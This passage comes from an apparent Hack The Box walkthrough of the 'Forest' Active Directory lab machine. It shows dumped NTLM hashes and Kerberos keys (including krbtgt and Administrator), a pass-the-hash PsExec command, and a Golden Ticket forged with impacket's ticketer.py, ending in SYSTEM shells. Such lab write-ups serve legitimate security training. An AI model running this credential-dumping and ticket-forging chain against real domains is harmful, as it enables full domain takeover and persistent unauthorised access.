htb.local<span class="se">\S</span>M_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local<span class="se">\S</span>M_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local<span class="se">\S</span>M_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local<span class="se">\H</span>ealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
htb.local<span class="se">\H</span>ealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
htb.local<span class="se">\H</span>ealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
htb.local<span class="se">\H</span>ealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
htb.local<span class="se">\H</span>ealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
htb.local<span class="se">\H</span>ealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
htb.local<span class="se">\H</span>ealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
htb.local<span class="se">\H</span>ealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
htb.local<span class="se">\H</span>ealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
htb.local<span class="se">\H</span>ealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
htb.local<span class="se">\H</span>ealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
htb.local<span class="se">\s</span>ebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local<span class="se">\l</span>ucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local<span class="se">\s</span>vc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local<span class="se">\a</span>ndy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local<span class="se">\m</span>ark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local<span class="se">\s</span>anti:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
amirr0r:9601:aad3b435b51404eeaad3b435b51404ee:d4a1be1776ad10df103812b1a923cde4:::
FOREST<span class="nv">$:</span>1000:aad3b435b51404eeaad3b435b51404ee:6f74ea9371b1049376b6280c8e0f0731:::
EXCH01<span class="nv">$:</span>1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Kerberos keys grabbed
htb.local<span class="se">\A</span>dministrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local<span class="se">\A</span>dministrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local<span class="se">\A</span>dministrator:des-cbc-md5:c1e049c71f57343b
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
krbtgt:des-cbc-md5:9dd5647a31518ca8
htb.local<span class="se">\H</span>ealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
htb.local<span class="se">\H</span>ealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
htb.local<span class="se">\H</span>ealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
htb.local<span class="se">\H</span>ealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
htb.local<span class="se">\H</span>ealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
htb.local<span class="se">\H</span>ealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
htb.local<span class="se">\H</span>ealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
htb.local<span class="se">\H</span>ealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
htb.local<span class="se">\H</span>ealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
htb.local<span class="se">\H</span>ealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
htb.local<span class="se">\H</span>ealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
htb.local<span class="se">\H</span>ealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
htb.local<span class="se">\H</span>ealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
htb.local<span class="se">\H</span>ealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
htb.local<span class="se">\H</span>ealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
htb.local<span class="se">\H</span>ealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
htb.local<span class="se">\H</span>ealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
htb.local<span class="se">\H</span>ealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
htb.local<span class="se">\H</span>ealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
htb.local<span class="se">\H</span>ealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
htb.local<span class="se">\H</span>ealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
htb.local<span class="se">\H</span>ealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
htb.local<span class="se">\H</span>ealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
htb.local<span class="se">\H</span>ealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
htb.local<span class="se">\H</span>ealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
htb.local<span class="se">\H</span>ealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
htb.local<span class="se">\H</span>ealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
htb.local<span class="se">\H</span>ealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
htb.local<span class="se">\H</span>ealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
htb.local<span class="se">\H</span>ealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
htb.local<span class="se">\H</span>ealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
htb.local<span class="se">\H</span>ealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
htb.local<span class="se">\H</span>ealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
htb.local<span class="se">\s</span>ebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
htb.local<span class="se">\s</span>ebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
htb.local<span class="se">\s</span>ebastien:des-cbc-md5:702a3445e0d65b58
htb.local<span class="se">\l</span>ucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
htb.local<span class="se">\l</span>ucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
htb.local<span class="se">\l</span>ucinda:des-cbc-md5:a13bb56bd043a2ce
htb.local<span class="se">\s</span>vc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
htb.local<span class="se">\s</span>vc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
htb.local<span class="se">\s</span>vc-alfresco:des-cbc-md5:014ac86d0b98294a
htb.local<span class="se">\a</span>ndy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
htb.local<span class="se">\a</span>ndy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
htb.local<span class="se">\a</span>ndy:des-cbc-md5:a2ab5eef017fb9da
htb.local<span class="se">\m</span>ark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
htb.local<span class="se">\m</span>ark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
htb.local<span class="se">\m</span>ark:des-cbc-md5:b5dff1f40b8f3be9
htb.local<span class="se">\s</span>anti:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
htb.local<span class="se">\s</span>anti:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
htb.local<span class="se">\s</span>anti:des-cbc-md5:4075ad528ab9e5fd
amirr0r:aes256-cts-hmac-sha1-96:1bcb06ac63d36244df3f5e5caf71124272fb4f3a39a92f7388e0dae5c6a1e994
amirr0r:aes128-cts-hmac-sha1-96:4579d5cfdce40a61edd38e611ecb54a4
amirr0r:des-cbc-md5:942f64df5b4f68c4
FOREST<span class="nv">$:</span>aes256-cts-hmac-sha1-96:436bb9ae0cf5796398fafe5ff9bdff2ad2d9159151a3da186753c95c708ffd9f
FOREST<span class="nv">$:</span>aes128-cts-hmac-sha1-96:51ff1311236394aa15091e4b7029f142
FOREST<span class="nv">$:</span>des-cbc-md5:e0c43de6544f5e83
EXCH01<span class="nv">$:</span>aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01<span class="nv">$:</span>aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01<span class="nv">$:</span>des-cbc-md5:8c45f44c16975129
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Cleaning up..
</pre></table></code></div></div><h3 id="pass-the-hash">Pass The Hash</h3><p>We can use <strong>PsExec</strong> with <code class="language-plaintext highlighter-rouge">Administrator</code> hashes to gain access:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python3 /usr/share/doc/python3-impacket/examples/psexec.py <span class="nt">-hashes</span> aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/htb/machines/windows/easy/forest/system.png" alt="" /></p><p>Now that we’re <strong>SYSTEM</strong> on the target machine, we could stop here… 😎</p><hr /><h2 id="going-further-with-golden-ticket-without-mimikatz">Going further with Golden Ticket… (without <code class="language-plaintext highlighter-rouge">mimikatz</code>)</h2><p>An additional thing that we can do to have fun is performing a <strong>Golden Ticket</strong> attack using the <code class="language-plaintext highlighter-rouge">KRBTGT</code> hash we retrieved.</p><p>1) First we need to grab the Domain SID (Security IDentifier):</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\svc-alfresco\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-ADDomain</span><span class="w"> </span><span class="nx">htb.local</span><span class="w">


</span><span class="n">AllowedDNSSuffixes</span><span class="w">                 </span><span class="p">:</span><span class="w"> </span><span class="p">{}</span><span class="w">
</span><span class="n">ChildDomains</span><span class="w">                       </span><span class="p">:</span><span class="w"> </span><span class="p">{}</span><span class="w">
</span><span class="n">ComputersContainer</span><span class="w">                 </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Computers</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">htb</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">local</span><span class="w">
</span><span class="nx">DeletedObjectsContainer</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Deleted</span><span class="w"> </span><span class="nx">Objects</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">htb</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">local</span><span class="w">
</span><span class="nx">DistinguishedName</span><span class="w">                  </span><span class="p">:</span><span class="w"> </span><span class="nx">DC</span><span class="o">=</span><span class="n">htb</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">local</span><span class="w">
</span><span class="nx">DNSRoot</span><span class="w">                            </span><span class="p">:</span><span class="w"> </span><span class="nx">htb.local</span><span class="w">
</span><span class="n">DomainControllersContainer</span><span class="w">         </span><span class="p">:</span><span class="w"> </span><span class="nx">OU</span><span class="o">=</span><span class="n">Domain</span><span class="w"> </span><span class="nx">Controllers</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">htb</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">local</span><span class="w">
</span><span class="nx">DomainMode</span><span class="w">                         </span><span class="p">:</span><span class="w"> </span><span class="nx">Windows2016Domain</span><span class="w">
</span><span class="n">DomainSID</span><span class="w">                          </span><span class="p">:</span><span class="w"> </span><span class="nx">S-1-5-21-3072663084-364016917-1341370565</span><span class="w">
</span><span class="n">ForeignSecurityPrincipalsContainer</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">ForeignSecurityPrincipals</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">htb</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">local</span><span class="w">
</span><span class="nx">Forest</span><span class="w">                             </span><span class="p">:</span><span class="w"> </span><span class="nx">htb.local</span><span class="w">
</span><span class="n">InfrastructureMaster</span><span class="w">               </span><span class="p">:</span><span class="w"> </span><span class="nx">FOREST.htb.local</span><span class="w">
</span><span class="n">LastLogonReplicationInterval</span><span class="w">       </span><span class="p">:</span><span class="w">
</span><span class="n">LinkedGroupPolicyObjects</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="n">CN</span><span class="o">=</span><span class="p">{</span><span class="mi">31</span><span class="n">B2F340-016D-11D2-945F-00C04FB984F9</span><span class="p">},</span><span class="n">CN</span><span class="o">=</span><span class="n">Policies</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="n">System</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">htb</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">local</span><span class="p">}</span><span class="w">
</span><span class="n">LostAndFoundContainer</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">LostAndFound</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">htb</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">local</span><span class="w">
</span><span class="nx">ManagedBy</span><span class="w">                          </span><span class="p">:</span><span class="w">
</span><span class="n">Name</span><span class="w">                               </span><span class="p">:</span><span class="w"> </span><span class="nx">htb</span><span class="w">
</span><span class="n">NetBIOSName</span><span class="w">                        </span><span class="p">:</span><span class="w"> </span><span class="nx">HTB</span><span class="w">
</span><span class="n">ObjectClass</span><span class="w">                        </span><span class="p">:</span><span class="w"> </span><span class="nx">domainDNS</span><span class="w">
</span><span class="n">ObjectGUID</span><span class="w">                         </span><span class="p">:</span><span class="w"> </span><span class="nx">dff0c71a-a949-4b26-8c7b-52e3e2cb6eab</span><span class="w">
</span><span class="n">ParentDomain</span><span class="w">                       </span><span class="p">:</span><span class="w">
</span><span class="n">PDCEmulator</span><span class="w">                        </span><span class="p">:</span><span class="w"> </span><span class="nx">FOREST.htb.local</span><span class="w">
</span><span class="n">PublicKeyRequiredPasswordRolling</span><span class="w">   </span><span class="p">:</span><span class="w"> </span><span class="nx">True</span><span class="w">
</span><span class="n">QuotasContainer</span><span class="w">                    </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">NTDS</span><span class="w"> </span><span class="nx">Quotas</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">htb</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">local</span><span class="w">
</span><span class="nx">ReadOnlyReplicaDirectoryServers</span><span class="w">    </span><span class="p">:</span><span class="w"> </span><span class="p">{}</span><span class="w">
</span><span class="n">ReplicaDirectoryServers</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="n">FOREST.htb.local</span><span class="p">}</span><span class="w">
</span><span class="n">RIDMaster</span><span class="w">                          </span><span class="p">:</span><span class="w"> </span><span class="nx">FOREST.htb.local</span><span class="w">
</span><span class="n">SubordinateReferences</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="n">DC</span><span class="o">=</span><span class="n">ForestDnsZones</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">htb</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">local</span><span class="p">,</span><span class="w"> </span><span class="nx">DC</span><span class="o">=</span><span class="n">DomainDnsZones</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">htb</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">local</span><span class="p">,</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="kr">Configuration</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">htb</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">local</span><span class="p">}</span><span class="w">
</span><span class="n">SystemsContainer</span><span class="w">                   </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">System</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">htb</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">local</span><span class="w">
</span><span class="nx">UsersContainer</span><span class="w">                     </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">htb</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">local</span><span class="w">
</span></pre></table></code></div></div><p>2) Now that we have the Domain SID (<code class="language-plaintext highlighter-rouge">S-1-5-21-3072663084-364016917-1341370565</code>), we can use <code class="language-plaintext highlighter-rouge">ticketer.py</code> from <strong>impacket</strong> to generate a TGT with the <code class="language-plaintext highlighter-rouge">krbtgt</code> password Hash for a user who does not exist:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="c"># python ticketer.py -nthash &lt;krbtgt_ntlm_hash&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain_name&gt;  &lt;user_name&gt;</span>
<span class="nv">$ </span>ticketer.py <span class="nt">-nthash</span> 819af826bb148e603acb0f33d17632f8 <span class="nt">-domain-sid</span> S-1-5-21-3072663084-364016917-1341370565 <span class="nt">-domain</span> htb.local doesnotexist
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating basic skeleton ticket and PAC Infos
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Customizing ticket <span class="k">for </span>htb.local/doesnotexist
<span class="o">[</span><span class="k">*</span><span class="o">]</span>     PAC_LOGON_INFO
<span class="o">[</span><span class="k">*</span><span class="o">]</span>     PAC_CLIENT_INFO_TYPE
<span class="o">[</span><span class="k">*</span><span class="o">]</span>     EncTicketPart
<span class="o">[</span><span class="k">*</span><span class="o">]</span>     EncAsRepPart
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Signing/Encrypting final ticket
<span class="o">[</span><span class="k">*</span><span class="o">]</span>     PAC_SERVER_CHECKSUM
<span class="o">[</span><span class="k">*</span><span class="o">]</span>     PAC_PRIVSVR_CHECKSUM
<span class="o">[</span><span class="k">*</span><span class="o">]</span>     EncTicketPart
<span class="o">[</span><span class="k">*</span><span class="o">]</span>     EncASRepPart
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>doesnotexist.ccache
<span class="nv">$ </span><span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>doesnotexist.ccache
<span class="c"># python psexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass</span>
<span class="nv">$ </span>psexec.py htb.local/amirr0r@<span class="nv">$TARGET</span> <span class="nt">-k</span> <span class="nt">-no-pass</span>
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<span class="o">[</span>-] Kerberos SessionError: KRB_AP_ERR_SKEW<span class="o">(</span>Clock skew too great<span class="o">)</span>
</pre></table></code></div></div><p>This error indicates that we have to synchronise our localtime with the DC clock. We can use <code class="language-plaintext highlighter-rouge">ntpdate</code> to solve this issue.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ntpdate <span class="nv">$TARGET</span>
 6 Sep 18:04:19 ntpdate[6024]: step <span class="nb">time </span>server 10.10.10.161 offset +611.916121 sec
</pre></table></code></div></div><p>I also added <code class="language-plaintext highlighter-rouge">forest</code> to the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file :</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>10.10.10.161  htb.local forest
</pre></table></code></div></div><p>Then it worked:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="nv">$ </span>psexec.py htb.local/doesnotexist@forest <span class="nt">-k</span> <span class="nt">-no-pass</span>
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on forest.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file lItXNAXI.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on forest.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service bnPS on forest.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service bnPS.....
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
Microsoft Windows <span class="o">[</span>Version 10.0.14393]
<span class="o">(</span>c<span class="o">)</span> 2016 Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;exit
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on forest.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Stopping service bnPS.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Removing service bnPS.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Removing file lItXNAXI.exe.....

<span class="c"># smbexec also works</span>
smbexec.py htb.local/doesnotexist@forest <span class="nt">-k</span> <span class="nt">-no-pass</span>
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<span class="o">[!]</span> Launching semi-interactive shell - Careful what you execute
C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
nt authority<span class="se">\s</span>ystem
</pre></table></code></div></div><hr /><h2 id="useful-links">Useful links</h2><ul><li><a href="https://docs.alfresco.com/process-services/latest/config/authenticate/">Alfresco documentation</a></li><li><a href="https://thehackernews.com/2021/09/what-is-as-rep-roasting-attack-really.html">What is AS-REP Roasting attack, really?</a></li><li><a href="https://www.thehacker.recipes/">The hacker recipes</a></li><li><a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">winPEAS</a></li><li><a href="https://github.com/BloodHoundAD/BloodHound#about-bloodhound">BloodHound</a></li><li><a href="https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe">SharpHound.exe</a></li><li><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-accountoperators">Microsoft documentation - Account Operators group</a></li><li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView.ps1</a></li><li><a href="https://youtu.be/o98_eRt777Y">VbScrub - Kerberos Golden Ticket Attack Explained</a></li><li><a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/well-known-sids">Well known SIDS</a></li><li><a href="https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#golden-ticket">Kerberos attacks cheatsheet (Golden Ticket from Linux)</a></li></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox-walkthroughs/'>Hackthebox walkthroughs</a>, <a href='/categories/windows/'>Windows</a>, <a href='/categories/easy/'>Easy</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/alfresco/" class="post-tag no-text-decoration" >Alfresco</a> <a href="/tags/active-directory/" class="post-tag no-text-decoration" >Active Directory</a> <a href="/tags/domain-controller/" class="post-tag no-text-decoration" >Domain Controller</a> <a href="/tags/as-rep-roasting/" class="post-tag no-text-decoration" >AS-REP Roasting</a> <a href="/tags/dcsync/" class="post-tag no-text-decoration" >DCSync</a> <a href="/tags/rpcclient/" class="post-tag no-text-decoration" >rpcclient</a> <a href="/tags/ldapsearch/" class="post-tag no-text-decoration" >ldapsearch</a> <a href="/tags/anonymous-ldap-binds/" class="post-tag no-text-decoration" >Anonymous LDAP binds</a> <a href="/tags/crackmapexec/" class="post-tag no-text-decoration" >crackmapexec</a> <a href="/tags/kerberos/" class="post-tag no-text-decoration" >Kerberos</a> <a href="/tags/kerbrute/" class="post-tag no-text-decoration" >kerbrute</a> <a href="/tags/bloodhound/" class="post-tag no-text-decoration" >Bloodhound</a> <a href="/tags/bloodhound-python/" class="post-tag no-text-decoration" >bloodhound-python</a> <a href="/tags/sharphound/" class="post-tag no-text-decoration" >SharpHound</a> <a href="/tags/impacket/" class="post-tag no-text-decoration" >impacket</a> <a href="/tags/impacket-secretsdump/" class="post-tag no-text-decoration" >impacket-secretsdump</a> <a href="/tags/getnpusers.py/" class="post-tag no-text-decoration" >GetNPUsers.py</a> <a href="/tags/john-the-ripper/" class="post-tag no-text-decoration" >John The Ripper</a> <a href="/tags/evil-winrm/" class="post-tag no-text-decoration" >Evil-WinRM</a> <a href="/tags/powerview/" class="post-tag no-text-decoration" >PowerView</a> <a href="/tags/smbserver.py/" class="post-tag no-text-decoration" >smbserver.py</a> <a href="/tags/secretsdump.py/" class="post-tag no-text-decoration" >secretsdump.py</a> <a href="/tags/bypass-4msi/" class="post-tag no-text-decoration" >Bypass-4MSI</a> <a href="/tags/pass-the-hash/" class="post-tag no-text-decoration" >Pass The Hash</a> <a href="/tags/psexec.py/" class="post-tag 